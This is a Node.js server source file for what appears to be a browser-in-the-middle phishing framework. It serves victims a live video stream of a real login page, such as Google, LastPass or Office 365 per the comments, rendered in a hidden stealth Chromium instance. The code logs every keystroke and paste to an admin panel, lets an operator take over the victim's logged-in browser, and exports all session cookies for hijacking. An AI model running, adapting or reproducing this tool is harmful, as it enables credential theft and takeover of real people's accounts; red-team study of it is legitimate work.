import fs from 'fs'
import path from 'path'
const __dirname = path.resolve()
import dateFormat from "dateformat/lib/dateformat.js"
import Fastify from 'fastify'
import fastify_io from 'fastify-socket.io'
import puppeteer from 'puppeteer-extra'
import StealthPlugin from 'puppeteer-extra-plugin-stealth'
puppeteer.use(StealthPlugin())
import resize_window from './resize_window.js'
import replace from 'stream-replace'
import Xvfb from 'xvfb'

//import custom config with target options
const config = JSON.parse(fs.readFileSync('./config.js', 'utf8'))

const target = config[process.argv[2]]

//const default_user_agent = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko"
const default_user_agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36"
const target_url = target.login_page
//const target_url = "https://accounts.google.com/"
//const target_url = "https://lastpass.com/?ac=1&lpnorefresh=1"
//const target_url = "https://www.office.com/"
//const target_url_title_search = "Accounts"
const target_url_title_search = target.tab_title
//const target_url_title_search = "Login"
//const target_url_title_search = "LastPass"
//const page_title = "Sign In - Google Accounts"
const page_title = target.tab_title
//const page_title = "LastPass - Sign In"
//const page_title = "Microsoft 365 Login | Microsoft Office"

//set up a user data directory if it doesn't exist
try{
  fs.mkdirSync('./user_data')
}catch(err){
  //must exist already. We do it this way to avoid a race condition of checking the existence of the dir before trying to write to it
}

const fastify = Fastify({
  logger: false,
  bodyLimit: 19922944
})

fastify.register(fastify_io, {})

//maps socket IDs of viewer/controllers to their phishbowl instances
var controller_to_browser = {}

//maps chromium instance socket IDs to their current viewer/controller's socket ID
var browser_to_controller = {}

//maps chromium instance socket IDs to their origional viewer/controller's socket ID for keylogging etc.
var browser_to_first_controller = {}

//key logs per user
var keylogs = {}

//keep track of some key active objects
var socket_to_browser = {}
var viewers = []
var admins = []

//copy the favicon of the site you want to MitM
fastify.route({
  method: ['GET'],
  url: '/favicon.ico',
  handler: async function (req, reply) {
    let stream = fs.createReadStream(__dirname + "/" + target.favicon)
    //let stream = fs.createReadStream(__dirname + "/favicon.ico")
    reply.type('image/x-icon').send(stream)
  }
})

//standard victim route
fastify.route({
  method: ['GET'],
  url: '/',
  handler: async function (req, reply) {
    let client_ip = req.headers['x-real-ip']
    console.log('client_ip: ' + client_ip)
    //if(client_ip == '76.232.12.98'){
    if(client_ip == '4.38.75.182'){
    //if(client_ip == '174.108.230.42'){
      let stream = fs.createReadStream(__dirname + "/cuddlephish.html")
      reply.type('text/html').send(stream.pipe(replace(/PAGE_TITLE/, page_title)))
    }else{
      reply.type('text/html').send("403")
    }
  }
})

//rcss protections
fastify.route({
  method: ['GET'],
  url: '/style.css',
  handler: async function (req, reply) {
    let client_ip = req.headers['x-real-ip']
    console.log('client_ip: ' + client_ip)
    console.log('headers: ' + JSON.stringify(req.headers))
    //if(client_ip == '76.232.12.98'){
    let style = "#test {background: red;}"
    reply.type('text/css').send(style)
  }
})

//route for the headless browser to broadcast a video stream
fastify.route({
  method: ['GET'],
  url: '/broadcast',
  handler: async function (req, reply) {
    let client_ip = req.headers['x-real-ip']
    //only allow requests that have not traversed our HTTP server reverse proxy
    if(client_ip == undefined){
      let stream = fs.createReadStream(__dirname + "/broadcast.html")
      reply.type('text/html').send(stream)
    }else{
      reply.type('text/html').send("403")
    }
  }
})

//admin route
fastify.route({
  method: ['GET'],
  url: '/admin',
  handler: async function (req, reply) {
    let client_ip = req.headers['x-real-ip']
    console.log('admin_ip: ' + client_ip)
    //if(client_ip == '76.232.12.98'){
    if(client_ip == '4.38.75.182'){
    //if(client_ip == '174.108.230.42'){
      let stream = fs.createReadStream(__dirname + "/admin.html")
      reply.type('text/html').send(stream)
    }else{
      reply.type('text/html').send("403")
    }
  }
})

fastify.route({
  method: ['GET'],
  url: '/jquery.min.js',
  handler: async function (req, reply) {
    let stream = fs.createReadStream(__dirname + "/node_modules/jquery/dist/jquery.min.js")
    reply.type('text/javascript').send(stream)
  }
})

async function get_browser(target_page){
  let xvfb = new Xvfb({
    silent: true,
    //xvfb_args: ["-screen", "0", '1280x720x24', "-ac"]
    xvfb_args: ["-screen", "0", '2880x1800x24', "-ac"]
  })
  xvfb.start((err)=>{if (err) console.error(err)})
  let puppet_options = [
    "--ignore-certificate-errors",
    `--auto-select-desktop-capture-source=${target_url_title_search}`,
    "--disable-blink-features=AutomationControlled",
    "--start-maximized",
    "--no-sandbox",
    `--display=${xvfb._display}`
  ]

  //set up a unique user data directory for this session so users don't stomp on each others' connections
  let random_dir = Math.random().toString(36).slice(2)
  fs.mkdirSync(`./user_data/${random_dir}`)
  
  let browser = await puppeteer.launch({
    headless: false,
    ignoreHTTPSErrors: true,
    ignoreDefaultArgs: ["--enable-automation"],
    defaultViewport: null,
    userDataDir: `./user_data/${random_dir}`,
    args: puppet_options
  })

  browser.broadcast_id = ''
  browser.user_data_dir = random_dir
  browser.target_page = await browser.newPage()
  browser.target_page.setUserAgent(default_user_agent)
  //automatically dismiss alerts etc.
  browser.target_page.on('dialog', async dialog => {
    console.log(dialog.message())
    //await dialog.dismiss()
    await dialog.accept()
  })
  browser.remove_instance = async function(){
    xvfb.stop((err)=>{if (err) console.error(err)})
    await browser.close()
    console.log('killed browser')
  }
  await browser.target_page.goto(target_page, {waitUntil: 'networkidle2'})
  browser.broadcast_page = await browser.newPage()
  browser.broadcast_page.goto('http://localhost:58082/broadcast')
  return browser
}

fastify.ready(async function(err){
  if (err) throw err 
  //var new_browser = await get_browser('https://www.office.com/')
  var empty_phishbowl = await get_browser(target_url)
  fastify.io.on('connect', function(socket){
    console.info('Socket connected!', socket.id)
    socket.on('new_admin', async function(){
      admins.push(socket.id)
      socket.join('admin_room')
      //fastify.io.to('browser_room').emit('stream_thumbnail_to_admin', socket.id)
    })
    socket.on('new_broadcast', async function(){
      socket.join('browser_room')
      empty_phishbowl.broadcast_id = socket.id
      socket_to_browser[socket.id] = empty_phishbowl
      empty_phishbowl.target_page.on('framenavigated', function(frame){
        if(frame.parentFrame() === null) {
          if(browser_to_controller[socket.id] !== undefined){
            fastify.io.to(browser_to_controller[socket.id]).emit('push_state', frame.url().split('/').slice(3).join('/'))
	  }
        }
      })
    })
    socket.on('new_phish', async function(viewport_width, viewport_height){
      viewers.push(socket.id)
      await resize_window(empty_phishbowl, empty_phishbowl.target_page, viewport_width, viewport_height)
      await empty_phishbowl.target_page.setViewport({width: viewport_width, height: viewport_height})
      keylogs[socket.id] = ''
      controller_to_browser[socket.id] = empty_phishbowl
      browser_to_controller[empty_phishbowl.broadcast_id] = socket.id
      browser_to_first_controller[empty_phishbowl.broadcast_id] = socket.id
      fastify.io.to('admin_room').emit('new_phish', socket.id, empty_phishbowl.broadcast_id)
      fastify.io.to(controller_to_browser[socket.id].broadcast_id).emit('stream_video_to_first_viewer', socket.id)
      //console.log(empty_phishbowl)
      empty_phishbowl = await get_browser(target_url)
    })
    socket.on('new_thumbnail', async function(thumbnail){
      let viewer_socket = browser_to_first_controller[socket.id]
      //console.log('viewer_socket: ' + viewer_socket)
      fastify.io.to('admin_room').emit('thumbnail', socket.id, viewer_socket, thumbnail, keylogs[viewer_socket])
    })
    socket.on('video_stream_offer', async function(viewer_socket_id, offer){
      //forward on to the viewer
      await controller_to_browser[viewer_socket_id].broadcast_page.bringToFront()
      fastify.io.to(viewer_socket_id).emit('video_stream_offer', socket.id, offer)
      console.log('video_stream_offer')
      console.log('viewer_id: ' + viewer_socket_id)
      console.log('offer: ' + offer)
      //await resize_window(controller_to_browser[viewer_socket_id].browser, controller_to_browser[viewer_socket_id].browser.target_page, 970, 1680)
    })
    socket.on('video_stream_answer', async function(broadcaster_socket_id, answer){
      //forward on to the viewer
      fastify.io.to(broadcaster_socket_id).emit('video_stream_answer', socket.id, answer)
      console.log('video_stream_answer')
      console.log('broacaster_id: ' + broadcaster_socket_id)
      console.log('answer: ' + answer)
    })
    socket.on("take_over_browser", async function(browser_socket, viewport_width, viewport_height){
      const browser = socket_to_browser[browser_socket]
      let current_controller = browser_to_controller[browser_socket]
      if(socket.id != current_controller){
        browser_to_controller[browser_socket] = socket.id
        delete controller_to_browser[current_controller]
      }
      controller_to_browser[socket.id] = browser
      await resize_window(browser, browser.target_page, viewport_width, viewport_height)
      await browser.target_page.setViewport({width: viewport_width, height: viewport_height})
      fastify.io.to(browser_socket).emit('stream_to_admin', socket.id)
    })
    socket.on("boot_user", async function(user_socket){
      console.log("booting user: " + user_socket)
      fastify.io.to(user_socket).emit('execute_script', `window.location = "${target_url}";`)
    })
    socket.on("get_cookies", async function(browser_socket){
      const browser = socket_to_browser[browser_socket]
      let cookie_data = await browser.target_page._client.send('Network.getAllCookies')
      let cookies = cookie_data.cookies
      let edit_this_cookie = []
      let counter = 0
      for(const cookie of cookies){
        let new_obj = {}
        new_obj.domain = cookie.domain
        new_obj.expirationDate = cookie.expires
        new_obj.hostOnly = false
        new_obj.httpOnly = cookie.httpOnly
        new_obj.name = cookie.name
        new_obj.path = cookie.path
        new_obj.sameSite =  "unspecified"
        new_obj.secure = cookie.secure
        new_obj.session = cookie.session
        new_obj.session = cookie.session
        new_obj.storeId = "1"
        new_obj.value = cookie.value
        new_obj.id = counter
        edit_this_cookie.push(new_obj)
        counter++
      }
      fastify.io.to(socket.id).emit('cookie_jar', edit_this_cookie)
    })
    socket.on("remove_instance", async function(browser_socket){
      const browser = socket_to_browser[browser_socket]
      delete browser_to_controller[browser_socket]
      delete browser_to_first_controller[browser_socket]
      delete socket_to_browser[browser_socket]
      await browser.remove_instance()
      fastify.io.to('admin_room').emit('removed_instance', browser_socket)
    })
    socket.on("candidate", async function(peer_socket_id, message){
      console.log('candidate: ' + socket.id + ' to ' + peer_socket_id)
      fastify.io.to(peer_socket_id).emit("candidate", socket.id, message)
    })
    socket.on("go_back", async function(){
      await controller_to_browser[socket.id].target_page.goBack()
    })
    socket.on("copy", async function(){
      let data = await controller_to_browser[socket.id].target_page.evaluate("if(window.document.getElementsByTagName('iframe')[0] != undefined){window.document.getElementsByTagName('iframe')[0].contentDocument.getSelection().toString();}else{window.document.getSelection().toString();}")
      console.log(data)
      fastify.io.to(socket.id).emit("copy_to_clipboard", data)
    })
    socket.on("paste", async function(paste_data){
      //console.log(`Paste: ${paste_data}`)
      let current_val = keylogs[socket.id]
      keylogs[socket.id] = current_val + paste_data
      fastify.io.to('admin_room').emit('keylog', socket.id, keylogs[socket.id])
      await controller_to_browser[socket.id].target_page.keyboard.type(paste_data)
    })
    socket.on("keydown", async function(key){
      console.log(`keylog: ${socket.id}: ${key}`)
      let current_val = keylogs[socket.id]
      let new_val = ''
      if(key == 'Backspace'){
        new_val = current_val.slice(0,-1)
      }else if(key == 'Shift'){
        new_val = current_val
      }else if(key == 'Tab'){
        new_val = current_val + '\n'
      }else if(key == 'Enter'){
        new_val = current_val + '\n'
      }else{
        new_val = current_val + key
      }
      keylogs[socket.id] = new_val
      fastify.io.to('admin_room').emit('keylog', socket.id, new_val)
      await controller_to_browser[socket.id].target_page.keyboard.down(key)
    })
    socket.on("keyup", async function(key){
      await controller_to_browser[socket.id].target_page.keyboard.up(key)
    })
    socket.on("mouse_event", async function(mouse_event){
      if(controller_to_browser[socket.id]){
        if(mouse_event.type === "click"){
          //console.log(JSON.stringify(mouse_event))
          await controller_to_browser[socket.id].target_page.mouse.move(mouse_event.clientX, mouse_event.clientY)
          //await controller_to_browser[socket.id].browser.target_page.mouse.click(mouse_event.clientX, mouse_event.clientY, {clickCount: 1, button: 'left' })
        }else if(mouse_event.type === "mousewheel"){
          //console.log(mouse_event)
          controller_to_browser[socket.id].target_page.mouse.wheel({"deltaX": mouse_event.wheelDeltaX})
          controller_to_browser[socket.id].target_page.mouse.wheel({"deltaY": mouse_event.wheelDeltaY})
          //await page.mouse.wheel({"deltaX": mouse_event.wheelDeltaX, "deltaY": mouse_event.wheelDeltaY})
        }else if(mouse_event.type === "mousedown"){
          await controller_to_browser[socket.id].target_page.mouse.down(mouse_event.clientX, mouse_event.clientY)
        }else if(mouse_event.type === "mouseup"){
          await controller_to_browser[socket.id].target_page.mouse.up(mouse_event.clientX, mouse_event.clientY)
        }else if(mouse_event.type === "mousemove"){
          await controller_to_browser[socket.id].target_page.mouse.move(mouse_event.clientX, mouse_event.clientY)
        }
      }else{
        console.log("rogue viewer")
      }
    })
  })
})

// Run the server!
const start = async () => {
  fastify.listen(58082, '0.0.0.0', (err) => {
    if (err) {
      fastify.log.error(err)
      process.exit(1)
    }
    fastify.log.info(`fastify listening on ${fastify.server.address().port}`)
  })
}
start()
